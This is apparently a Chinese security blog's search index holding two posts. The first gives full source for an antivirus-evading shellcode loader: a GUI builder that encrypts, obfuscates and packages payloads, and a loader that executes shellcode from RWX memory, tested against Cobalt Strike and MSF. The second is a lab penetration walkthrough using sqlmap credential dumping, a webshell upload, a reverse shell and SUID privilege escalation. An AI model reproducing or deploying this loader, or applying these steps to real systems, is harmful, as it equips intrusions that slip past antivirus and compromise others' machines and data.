<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>“免杀shellcode加载器——加密混淆系列”</title>
    <link href="/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/"/>
    <url>/2023/03/24/%E2%80%9C%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E2%80%94%E2%80%94%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%B3%BB%E5%88%97%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<h3 id="Python加载shellcode免杀介绍"><a href="#Python加载shellcode免杀介绍" class="headerlink" title="Python加载shellcode免杀介绍"></a>Python加载shellcode免杀介绍</h3><p>Python的简单易用使得它成为了许多免杀工具的首选语言。它可以轻松地处理shellcode，进行加密和混淆。使用Python实现各种加密也相对简单，且免杀效果较好。但是，Python编译生成的exe文件较大，这是它唯一的不足之处（本文将介绍如何缩小Python代码）。<br>VirusTotal：<br><img src="/../images/20230324172413.png"><br>微步：<br><img src="/../images/20230324172811.png"></p><h3 id="加载器脚本源码介绍"><a href="#加载器脚本源码介绍" class="headerlink" title="加载器脚本源码介绍"></a>加载器脚本源码介绍</h3><h4 id="jiami-py加密脚本"><a href="#jiami-py加密脚本" class="headerlink" title="jiami.py加密脚本"></a>jiami.py加密脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk<br><span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> filedialog<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> python_minifier<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_to_16</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(s) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>:<br>        s += <span class="hljs-string">&#x27;\0&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>.encode(s)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_jiami</span>(<span class="hljs-params">text</span>):<br>    key = <span class="hljs-string">&#x27;LeslieCheungKwok&#x27;</span><br>    aes = AES.new(add_to_16(key), AES.MODE_ECB)<br>    encrypted_text = <span class="hljs-built_in">str</span>(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> encrypted_text<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_jiami</span>(<span class="hljs-params">s, key</span>):<br>    xor_s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        xor_s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) ^ key)<br>    <span class="hljs-keyword">return</span> xor_s<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile</span>():<br>    payload_path = entry1.get()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(payload_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>        b64_data = base64.b64encode(data)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.bs64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(b64_data)<br>        sc = Path(<span class="hljs-string">&#x27;payload.bs64&#x27;</span>).read_text()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./aes-xor.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(aes_jiami(xor_jiami(sc, <span class="hljs-number">35</span>)).encode())<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aes-xor.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        jiami_sc = f.read().strip()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;main.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br>    content = content.replace(<span class="hljs-string">&quot;jiami_sc = &#x27;&#x27;&quot;</span>, <span class="hljs-string">f&quot;jiami_sc = &#x27;<span class="hljs-subst">&#123;jiami_sc&#125;</span>&#x27;&quot;</span>)<br>    mini_content = python_minifier.minify(content)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;main-mini.py&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(mini_content)<br>    url = <span class="hljs-string">&quot;https://pyob.oxyry.com/obfuscate&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;main-mini.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        source = f.read()<br>    payload = &#123;<br>      <span class="hljs-string">&quot;append_source&quot;</span>: <span class="hljs-literal">False</span>,<br>      <span class="hljs-string">&quot;remove_docstrings&quot;</span>: <span class="hljs-literal">True</span>,<br>      <span class="hljs-string">&quot;rename_nondefault_parameters&quot;</span>: <span class="hljs-literal">True</span>,<br>      <span class="hljs-string">&quot;rename_default_parameters&quot;</span>: <span class="hljs-literal">False</span>,<br>      <span class="hljs-string">&quot;preserve&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-string">&quot;source&quot;</span>: source<br>    &#125;<br>    headers = &#123;<br>      <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>      <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;https://pyob.oxyry.com/&quot;</span>,<br>      <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;https://pyob.oxyry.com&quot;</span><br>    &#125;<br>    response = requests.post(url, json=payload, headers=headers)<br>    json_obj = json.loads(response.text)<br>    dest_value=json_obj[<span class="hljs-string">&#x27;dest&#x27;</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;main-mini-obfuscated.py&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>       f.write(dest_value)<br>    os.rename(<span class="hljs-string">&quot;main-mini-obfuscated.py&quot;</span>, <span class="hljs-string">&quot;main-mini-ob.py&quot;</span>)<br>    <span class="hljs-built_in">print</span>(response.text)<br>    os.system(<span class="hljs-string">&quot;pyinstaller.exe -Fw -i icon.ico --key=leslie --distpath=./dist main-mini-ob.py&quot;</span>)<br>root = tk.Tk()<br>root.title(<span class="hljs-string">&quot;shallcode加载器v1.0&quot;</span>)<br>root.geometry(<span class="hljs-string">&quot;400x200&quot;</span>)<br>label1 = tk.Label(root, text=<span class="hljs-string">&quot;选择payload.raw的路径:&quot;</span>)<br>label1.pack()<br>label2 = tk.Label(root, text=<span class="hljs-string">&quot;可执行文件将生成在当前文件夹&quot;</span>)<br>label2.pack()<br>entry1 = tk.Entry(root)<br>entry1.pack()<br>button1 = tk.Button(root, text=<span class="hljs-string">&quot;raw&quot;</span>, command=<span class="hljs-keyword">lambda</span>: entry1.insert(tk.END, filedialog.askopenfilename()))<br>button2 = tk.Button(root, text=<span class="hljs-string">&quot;编译&quot;</span>, command=<span class="hljs-built_in">compile</span>)<br>label1.pack(side=tk.TOP, pady=<span class="hljs-number">10</span>)<br>label2.pack(side=tk.TOP, pady=<span class="hljs-number">10</span>)<br>entry1.pack(side=tk.TOP, pady=<span class="hljs-number">10</span>)<br>button1.pack(side=tk.LEFT, padx=<span class="hljs-number">60</span>)<br>button2.pack(side=tk.RIGHT, padx=<span class="hljs-number">60</span>, anchor=<span class="hljs-string">&#x27;center&#x27;</span>)<br>root.mainloop()<br></code></pre></td></tr></table></figure><p>定义一个函数用于将字符串长度扩展至16的倍数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_to_16</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(s) % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>:<br>        s += <span class="hljs-string">&#x27;\0&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>.encode(s)<br></code></pre></td></tr></table></figure><p>定义一个函数用于AES加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_jiami</span>(<span class="hljs-params">text</span>):<br>    key = <span class="hljs-string">&#x27;LeslieCheungKwok&#x27;</span><br>    aes = AES.new(add_to_16(key), AES.MODE_ECB)<br>    encrypted_text = <span class="hljs-built_in">str</span>(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> encrypted_text<br></code></pre></td></tr></table></figure><p>定义一个函数用于异或加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_jiami</span>(<span class="hljs-params">s, key</span>):<br>    xor_s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        xor_s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) ^ key)<br>    <span class="hljs-keyword">return</span> xor_s<br></code></pre></td></tr></table></figure><p>定义一个函数用于编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile</span>():<br>    payload_path = entry1.get()<span class="hljs-comment"># 获取文件路径</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(payload_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>        b64_data = base64.b64encode(data)<span class="hljs-comment"># 对文件进行base64编码</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.bs64&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(b64_data)<span class="hljs-comment"># 将编码后的结果写入文件</span><br>        sc = Path(<span class="hljs-string">&#x27;payload.bs64&#x27;</span>).read_text()<span class="hljs-comment">#读取编码后的文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./aes-xor.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(aes_jiami(xor_jiami(sc, <span class="hljs-number">35</span>)).encode())<span class="hljs-comment"># 将加密后的结果写入文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;aes-xor.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        jiami_sc = f.read().strip()<span class="hljs-comment"># 读取加密后的文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;main.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()  <span class="hljs-comment"># 读取模板代码</span><br>    content = content.replace(<span class="hljs-string">&quot;jiami_sc = &#x27;&#x27;&quot;</span>, <span class="hljs-string">f&quot;jiami_sc = &#x27;<span class="hljs-subst">&#123;jiami_sc&#125;</span>&#x27;&quot;</span>)<span class="hljs-comment"># 将模板代码中的jiami_sc替换为加密后的结果</span><br>    mini_content = python_minifier.minify(content)<span class="hljs-comment"># 对代码进行压缩</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;main-mini.py&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(mini_content)<br>    url = <span class="hljs-string">&quot;https://pyob.oxyry.com/obfuscate&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;main-mini.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        source = f.read()<br>    payload = &#123;<br>      <span class="hljs-string">&quot;append_source&quot;</span>: <span class="hljs-literal">False</span>,<br>      <span class="hljs-string">&quot;remove_docstrings&quot;</span>: <span class="hljs-literal">True</span>,<br>      <span class="hljs-string">&quot;rename_nondefault_parameters&quot;</span>: <span class="hljs-literal">True</span>,<br>      <span class="hljs-string">&quot;rename_default_parameters&quot;</span>: <span class="hljs-literal">False</span>,<br>      <span class="hljs-string">&quot;preserve&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-string">&quot;source&quot;</span>: source<br>    &#125;<span class="hljs-comment"># 定义API参数,对https://pyob.oxyry.com/调用其dancing links加密功能</span><br>    headers = &#123;<br>      <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>      <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;https://pyob.oxyry.com/&quot;</span>,<br>      <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;https://pyob.oxyry.com&quot;</span><br>    &#125;<span class="hljs-comment"># 定义请求头</span><br>    response = requests.post(url, json=payload, headers=headers)<span class="hljs-comment"># 发送API请求</span><br>    json_obj = json.loads(response.text)<span class="hljs-comment"># 解析API返回的JSON数据</span><br>    dest_value=json_obj[<span class="hljs-string">&#x27;dest&#x27;</span>]<span class="hljs-comment"># 获取加密后的代码</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;main-mini-obfuscated.py&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>       f.write(dest_value)<span class="hljs-comment"># 写入加密后的代码</span><br>    os.rename(<span class="hljs-string">&quot;main-mini-obfuscated.py&quot;</span>, <span class="hljs-string">&quot;main-mini-ob.py&quot;</span>)<span class="hljs-comment"># 重命名加密后的代码文件</span><br>    <span class="hljs-built_in">print</span>(response.text)<span class="hljs-comment"># 输出API返回的数据</span><br>    os.system(<span class="hljs-string">&quot;pyinstaller.exe -Fw -i icon.ico --key=leslie --distpath=./dist main-mini-ob.py&quot;</span>)<span class="hljs-comment"># 使用pyinstaller打包可执行文件</span><br></code></pre></td></tr></table></figure><h4 id="main-py主程序"><a href="#main-py主程序" class="headerlink" title="main.py主程序"></a>main.py主程序</h4><p>具体来说，代码中首先定义了一个名为”kernel32”的ctypes对象，它是Windows内核动态链接库的一个API。接下来，定义了两个解密函数，其中aes_jiemi函数使用AES算法解密字符串，xor_jiemi函数使用异或运算对字符串进行解密。</p><p>然后是write_memory函数，它将可执行代码写入内存。使用VirtualAlloc函数在内存中分配空间，然后使用RtlMoveMemory函数将shellcode写入这个空间。最后，将指向内存地址的指针返回给调用方。</p><p>最后是run函数，它调用了write_memory函数来将shellcode加载到内存中，然后使用ctypes.cast将指向内存地址的指针转换为CFUNCTYPE并执行，从而触发shellcode。如果shellcode编写正确，则会触发所需的行为。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> base64      <span class="hljs-comment"># 导入base64模块</span><br><span class="hljs-keyword">import</span> ctypes      <span class="hljs-comment"># 导入ctypes模块，提供Python调用C语言函数的接口</span><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES    <span class="hljs-comment"># 导入AES加密算法模块</span><br>kernel32 = ctypes.windll.kernel32   <span class="hljs-comment"># 加载Windows核心API</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_jiemi</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># AES解密函数</span><br>    cipher = AES.new(<span class="hljs-string">b&#x27;LeslieCheungKwok&#x27;</span>, AES.MODE_ECB)<br>    <span class="hljs-comment"># 解密base64编码的字符串，使用rstrip()方法移除末尾的空字符</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(base64.decodebytes(<span class="hljs-built_in">bytes</span>(s, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>))).rstrip(<span class="hljs-string">b&#x27;\0&#x27;</span>).decode(<span class="hljs-string">&quot;utf8&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_jiemi</span>(<span class="hljs-params">s, key</span>):<br>    <span class="hljs-comment"># XOR解密函数，其中s为需要解密的字符串，key为解密的密钥</span><br>    xor_s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        xor_s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) ^ key)  <span class="hljs-comment"># 将每个字符与密钥进行异或操作</span><br>    <span class="hljs-keyword">return</span> xor_s<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_memory</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-comment"># 内存写入函数，buf为需要写入内存的二进制数据</span><br>    length = <span class="hljs-built_in">len</span>(buf)<br>    kernel32.VirtualAlloc.restype = ctypes.c_void_p<br>    <span class="hljs-comment"># 分配内存空间，返回值为分配空间的起始地址</span><br>    ptr = kernel32.VirtualAlloc(<span class="hljs-literal">None</span>, length, <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>)<br>    kernel32.RtlMoveMemory.argtypes = (<br>        ctypes.c_void_p,<br>        ctypes.c_void_p,<br>        ctypes.c_size_t)<br>    <span class="hljs-comment"># 将buf数据拷贝到内存空间ptr中</span><br>    kernel32.RtlMoveMemory(ptr, buf, length)<br>    <span class="hljs-keyword">return</span> ptr<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">shellcode</span>):<br>    <span class="hljs-comment"># 执行函数，将shellcode参数写入内存后，执行内存中的代码</span><br>    buf = ctypes.create_string_buffer(shellcode)<br>    ptr = write_memory(buf)<br>    <span class="hljs-comment"># 将ptr指针转换为CFUNCTYPE类型，这样就可以像调用C函数一样执行内存中的代码</span><br>    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(<span class="hljs-literal">None</span>))<br>    shell_func()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    jiami_sc = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 解密加密后的Shellcode</span><br>    sc = xor_jiemi(aes_jiemi(jiami_sc), <span class="hljs-number">35</span>)<br>    <span class="hljs-comment"># 对解密后的Shellcode进行base64解码</span><br>    shde = base64.b64decode(sc)<br>    <span class="hljs-comment"># 执行Shellcode</span><br>    run(shde)<br></code></pre></td></tr></table></figure><h3 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h3><p>Cobalt Strike<br><img src="/../images/20233271.png"><br>MSF<br><img src="/../images/20233272.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>对某靶机环境进行渗透测试</title>
    <link href="/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="此靶机根据某博彩网站的真实环境所搭建。"><a href="#此靶机根据某博彩网站的真实环境所搭建。" class="headerlink" title="此靶机根据某博彩网站的真实环境所搭建。"></a>此靶机根据某博彩网站的真实环境所搭建。</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>在VMwareWorkstation中导入虚拟机<br><img src="/../images/9c47491f80d2fe12fe91697501b1f82.png"></p><p>开启虚拟机并登陆root账号，并查看apache服务是否开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -ef |grep httpd<br>ps -aux | grep httpd<br></code></pre></td></tr></table></figure><p><img src="/../images/8108a693a1e75ef188444c52ad689fa.png"></p><p>查看ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p><img src="/../images/a27143effacc23b122a0cd5c836d906.png"></p><h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>进入登录界面<br><img src="/../images/101110.png"></p><p>注册账号并进入网站<br><img src="/../images/101529.png"></p><p>点击商品<br><img src="/../images/103447.png"></p><p>url：<a href="http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html">http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html</a></p><p>发现参数pid后面的数字为注入点,用sqlmap跑出管理员账号密码(在指定注入的位置加上*）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r target.txt  --prefix <span class="hljs-string">&quot;26)&quot;</span> --suffix <span class="hljs-string">&quot;%23&quot;</span> -D weipans -T wp_userinfo --dump<br></code></pre></td></tr></table></figure><p>target.txt内容:<br><img src="/../images/135657.png"></p><p>管理员密码的md5值:<br><img src="/../images/134520.png"></p><p>md5值解密：<br><img src="/../images/140639.png"></p><p>进入网站后台并在参数设置-基本设置处发现文件上传点:<br><img src="/../images/141259.png"></p><p>上传冰蝎马并通过查看页面源代码确定上传位置:<br><img src="/../images/143456.png"></p><p>连接冰蝎,利用命令执行反弹shell并利用suid提权:<br><img src="/../images/144813.png"></p><p>发现find有suid表示位，所以可以利用find提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 111<br>find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></td></tr></table></figure><p>提权成功：<br><img src="/../images/154129.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
